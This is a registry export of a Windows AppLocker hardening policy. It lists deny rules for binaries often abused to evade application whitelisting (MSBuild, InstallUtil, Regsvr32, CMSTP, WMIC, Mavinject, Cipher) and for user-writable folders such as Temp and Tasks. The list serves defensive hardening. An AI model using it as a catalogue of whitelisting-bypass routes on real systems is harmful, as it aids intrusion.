    Value    REG_SZ    <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the Windows folder" Description="Allows members of the Everyone group to run applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\a74cc038-b350-4e27-8a89-341a0c004b94
    Value    REG_SZ    <FilePublisherRule Id="a74cc038-b350-4e27-8a89-341a0c004b94" Name="Block MSXSL.EXE (COMMAND LINE XSLT)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="COMMAND LINE XSLT" BinaryName="MSXSL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\a79804ad-4c02-45aa-aec4-961dadece78a
    Value    REG_SZ    <FilePublisherRule Id="a79804ad-4c02-45aa-aec4-961dadece78a" Name="KD.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="KD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\aaa1ddb1-3f20-4bcf-acca-476381d3a5a3
    Value    REG_SZ    <FilePathRule Id="aaa1ddb1-3f20-4bcf-acca-476381d3a5a3" Name="%SYSTEM32%\Spool\PRINTERS:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\PRINTERS:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\ab95fe82-5f8d-459a-b907-e5f09dd9d3e7
    Value    REG_SZ    <FilePublisherRule Id="ab95fe82-5f8d-459a-b907-e5f09dd9d3e7" Name="Block BASH.EXE (WINDOWS)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="BASH.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\ac3c92a9-474c-43f7-ad65-c6053e670518
    Value    REG_SZ    <FilePublisherRule Id="ac3c92a9-474c-43f7-ad65-c6053e670518" Name="Block CSI.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="" BinaryName="CSI.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\afc72fbb-7137-4417-9d30-e14b8d3081d0
    Value    REG_SZ    <FilePathRule Id="afc72fbb-7137-4417-9d30-e14b8d3081d0" Name="Users-writable Path: %WINDIR%\Tracing\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tracing\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\b2b3f98e-1b89-4d82-83e1-7de2c92844ed
    Value    REG_SZ    <FilePublisherRule Id="b2b3f98e-1b89-4d82-83e1-7de2c92844ed" Name="ADDINPROCESS.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="ADDINPROCESS.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\b5ff3b4b-47a4-4261-a9a0-48a89e627844
    Value    REG_SZ    <FilePathRule Id="b5ff3b4b-47a4-4261-a9a0-48a89e627844" Name="Users-writable Path: %WINDIR%\Registration\CRMLog\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Registration\CRMLog\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\bb56b1c2-1fda-4127-9449-0af916bf32ec
    Value    REG_SZ    <FilePublisherRule Id="bb56b1c2-1fda-4127-9449-0af916bf32ec" Name="REGSVCS.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="REGSVCS.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\c31e8190-f75d-4893-a18a-a73037524420
    Value    REG_SZ    <FilePublisherRule Id="c31e8190-f75d-4893-a18a-a73037524420" Name="IEEXEC.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="IEEXEC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\c6ca2ea3-4aac-4108-aa28-4ee06a0e6ea4
    Value    REG_SZ    <FilePublisherRule Id="c6ca2ea3-4aac-4108-aa28-4ee06a0e6ea4" Name="CMSTP.EXE, i MICROSOFT(R) CONNECTION MANAGER, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFT(R) CONNECTION MANAGER" BinaryName="CMSTP.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\c83133af-6cf9-4f6b-8d5d-d171170c876b
    Value    REG_SZ    <FilePathRule Id="c83133af-6cf9-4f6b-8d5d-d171170c876b" Name="%SYSTEM32%\runscripthelper.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="C:\windows\system32\runscripthelper.exe"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\c91093b8-d969-4fdf-bae9-1719d3abc744
    Value    REG_SZ    <FilePublisherRule Id="c91093b8-d969-4fdf-bae9-1719d3abc744" Name="Block WMIC.EXE (WMI)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="WMIC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\ca98d963-b624-4315-aaf9-ccefb360191c
    Value    REG_SZ    <FilePathRule Id="ca98d963-b624-4315-aaf9-ccefb360191c" Name="%SYSTEM32%\Com\dmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Com\dmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\cad337f7-3418-44e2-a898-f46fa9c53011
    Value    REG_SZ    <FilePublisherRule Id="cad337f7-3418-44e2-a898-f46fa9c53011" Name="DBGSVC.EXE, in DEBUG DIAGNOSTIC TOOL, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="DEBUG DIAGNOSTIC TOOL" BinaryName="DBGSVC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\cad83ab4-94bc-427d-bab0-676df2013f51
    Value    REG_SZ    <FilePublisherRule Id="cad83ab4-94bc-427d-bab0-676df2013f51" Name="DBGHOST.EXE, in DEBUG DIAGNOSTIC TOOL, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="DEBUG DIAGNOSTIC TOOL" BinaryName="DBGHOST.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\d16c9c4c-354b-4d1f-86c2-44ac46d330cd
    Value    REG_SZ    <FilePublisherRule Id="d16c9c4c-354b-4d1f-86c2-44ac46d330cd" Name="Block MSBUILD.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="MSBUILD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\d40d75f9-7241-44fa-bfe8-67075df655f3
    Value    REG_SZ    <FilePathRule Id="d40d75f9-7241-44fa-bfe8-67075df655f3" Name="%WINDIR%\Registration\CRMLog\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Registration\CRMLog\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\d56351b3-c70a-4d6c-b2e4-4a7c89aba112
    Value    REG_SZ    <FilePathRule Id="d56351b3-c70a-4d6c-b2e4-4a7c89aba112" Name="Users-writable Path: %WINDIR%\SysWOW64\com\dmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\SysWOW64\com\dmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\d8d97bbb-e9bb-4b4a-8ea2-d0dec222dd9a
    Value    REG_SZ    <FilePathRule Id="d8d97bbb-e9bb-4b4a-8ea2-d0dec222dd9a" Name="%SYSTEM32%\Spool\SERVERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\SERVERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\dacb237a-98b2-4530-a47e-2df5fa57467f
    Value    REG_SZ    <FilePathRule Id="dacb237a-98b2-4530-a47e-2df5fa57467f" Name="%WINDIR%\Temp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Temp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\dcf9a571-24ea-401b-9516-01b3418a5786
    Value    REG_SZ    <FilePathRule Id="dcf9a571-24ea-401b-9516-01b3418a5786" Name="%WINDIR%\tracing\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\tracing\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\dd255ac1-e20a-411b-983e-2e73b47b3f38
    Value    REG_SZ    <FilePathRule Id="dd255ac1-e20a-411b-983e-2e73b47b3f38" Name="Users-writable Path: %SYSTEM32%\com\dmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\com\dmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\dfa2c9c3-93c0-4525-8ed5-5651b8d56eca
    Value    REG_SZ    <FilePublisherRule Id="dfa2c9c3-93c0-4525-8ed5-5651b8d56eca" Name="Block MAVINJECT32.EXE (APPLICATION VIRTUALIZATION)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFT APPLICATION VIRTUALIZATION (APP-V)" BinaryName="MAVINJECT32.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e0c4c621-5e13-41ba-8834-a16d9b681221
    Value    REG_SZ    <FilePathRule Id="e0c4c621-5e13-41ba-8834-a16d9b681221" Name="Users-writable Path: %SYSTEM32%\FxsTmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\FxsTmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e304c5e6-291b-4aee-a54a-5313a6f5fa29
    Value    REG_SZ    <FilePathRule Id="e304c5e6-291b-4aee-a54a-5313a6f5fa29" Name="Users-writable Path: %SYSTEM32%\Drivers\DriverData\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Drivers\DriverData\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e3377cc5-bf3c-4296-ab28-6611b11d7c24
    Value    REG_SZ    <FilePublisherRule Id="e3377cc5-bf3c-4296-ab28-6611b11d7c24" Name="DFSVC.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="DFSVC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e4cfeb3a-ec89-4942-a53c-3f7575820f1a
    Value    REG_SZ    <FilePathRule Id="e4cfeb3a-ec89-4942-a53c-3f7575820f1a" Name="SCCM - %WINDIR%\ccm\inventory\noidmifs\*" Description="SCCM specific" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\inventory\noidmifs\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e4f13cce-93e8-4817-9103-90566c7beb0f
    Value    REG_SZ    <FilePathRule Id="e4f13cce-93e8-4817-9103-90566c7beb0f" Name="%WINDIR%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e5650154-b497-4e81-beaf-b0e5a80b3d05
    Value    REG_SZ    <FilePublisherRule Id="e5650154-b497-4e81-beaf-b0e5a80b3d05" Name="MAVINJECT32.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="MAVINJECT32.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e59cbf1a-4dc2-4206-8659-e2f3f2303446
    Value    REG_SZ    <FilePublisherRule Id="e59cbf1a-4dc2-4206-8659-e2f3f2303446" Name="REGSVR32.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="REGSVR32.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\e6ed08d5-4c21-417a-81b2-383a5ef22534
    Value    REG_SZ    <FilePublisherRule Id="e6ed08d5-4c21-417a-81b2-383a5ef22534" Name="Block INSTALLUTIL.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="INSTALLUTIL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\edadb9c3-9721-462e-ae4b-32e031c231dd
    Value    REG_SZ    <FilePublisherRule Id="edadb9c3-9721-462e-ae4b-32e031c231dd" Name="ADDINUTIL.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="ADDINUTIL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\f00d22e1-eb85-4f72-932f-1d1b737a693e
    Value    REG_SZ    <FileHashRule Id="f00d22e1-eb85-4f72-932f-1d1b737a693e" Name="chrome.exe - seleniumSimulator(Task schudler)" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FileHashCondition><FileHash Type="SHA256" Data="0xa270c187ab093e1f637158b07da93828879b1af2a72de5657852101df2a0af56" SourceFileName="chrome.exe" SourceFileLength="2592768"/></FileHashCondition></Conditions></FileHashRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\f00d22e1-eb85-4f72-932f-1d1b737a693f
    Value    REG_SZ    <FileHashRule Id="f00d22e1-eb85-4f72-932f-1d1b737a693f" Name="chrome.exe - seleniumSimulator(Task schudler)" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FileHashCondition><FileHash Type="SHA256" Data="0x7f399802c0f70d582b8522b8df1d4b0a4797b8b90df3e4be82b706eece8d6cf5" SourceFileName="chrome.exe" SourceFileLength="3235328"/></FileHashCondition></Conditions></FileHashRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\f1ee0cb2-c036-4c0e-940a-df723ac4f107
    Value    REG_SZ    <FilePublisherRule Id="f1ee0cb2-c036-4c0e-940a-df723ac4f107" Name="Block SYNCAPPVPUBLISHINGSERVER.EXE" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFT (R) WINDOWS (R) OPERATING SYSTEM" BinaryName="SYNCAPPVPUBLISHINGSERVER.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\f5114e04-bb0f-4510-ac72-dd66e8d4b267
    Value    REG_SZ    <FilePublisherRule Id="f5114e04-bb0f-4510-ac72-dd66e8d4b267" Name="NTKD.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="NTKD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\f962c129-2c3e-4c03-9815-7271938fc51e
    Value    REG_SZ    <FilePublisherRule Id="f962c129-2c3e-4c03-9815-7271938fc51e" Name="Block ODBCCONF.EXE (MDAC Utility)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="ODBCCONF.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fa3b9617-62a5-4642-9340-fac68c2c9ed6
    Value    REG_SZ    <FilePublisherRule Id="fa3b9617-62a5-4642-9340-fac68c2c9ed6" Name="CSI.EXE, i &quot;&quot;, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="" BinaryName="CSI.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fa7124ef-c39f-42c5-ac3c-1bf202596ee4
    Value    REG_SZ    <FilePathRule Id="fa7124ef-c39f-42c5-ac3c-1bf202596ee4" Name="%SYSTEM32%\Spool\SERVERS:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\SERVERS:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fba2c077-29b9-422d-a789-179f22fc4af3
    Value    REG_SZ    <FilePublisherRule Id="fba2c077-29b9-422d-a789-179f22fc4af3" Name="Block CIPHER.EXE (File often used by ransomware)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="CIPHER.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fd686d83-a829-4351-8ff4-27c7de5755d2
    Value    REG_SZ    <FilePathRule Id="fd686d83-a829-4351-8ff4-27c7de5755d2" Name="(Default Rule) All files" Description="Allows members of the local Administrators group to run all applications." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fdd2d2f7-9395-4be6-a67b-f188cbf5e83c
    Value    REG_SZ    <FilePathRule Id="fdd2d2f7-9395-4be6-a67b-f188cbf5e83c" Name="%WINDIR%\debug\WIA\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\debug\WIA\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Msi
    EnforcementMode    REG_DWORD    0x1
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Msi\082073fb-da0b-4ffc-819c-aed8b511f86f
    Value    REG_SZ    <FilePublisherRule Id="082073fb-da0b-4ffc-819c-aed8b511f86f" Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Msi\5b290184-345a-4453-b184-45305f6d9a54
    Value    REG_SZ    <FilePathRule Id="5b290184-345a-4453-b184-45305f6d9a54" Name="(Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer" Description="Allows members of the Everyone group to run all Windows Installer files located in %systemdrive%\Windows\Installer." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\Installer\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Msi\64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
    Value    REG_SZ    <FilePathRule Id="64ad46ff-0d71-4fa0-a30b-3f3d30c5433d" Name="(Default Rule) All Windows Installer files" Description="Allows members of the local Administrators group to run all Windows Installer files." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*.*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script
    EnforcementMode    REG_DWORD    0x1
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\0493d8a6-1313-4158-8347-97b5210db0bb
    Value    REG_SZ    <FilePathRule Id="0493d8a6-1313-4158-8347-97b5210db0bb" Name="Users-writable Path: %WINDIR%\Temp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Temp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\063a8799-acf3-4428-aa2d-77a256b7b5b1
    Value    REG_SZ    <FilePathRule Id="063a8799-acf3-4428-aa2d-77a256b7b5b1" Name="SCCM - %WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\137b5fc0-88b2-44a2-b041-6854d47c7417
    Value    REG_SZ    <FilePathRule Id="137b5fc0-88b2-44a2-b041-6854d47c7417" Name="Users-writable Path: %SYSTEM32%\FxsTmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\FxsTmp\*"/></Conditions></FilePathRule>

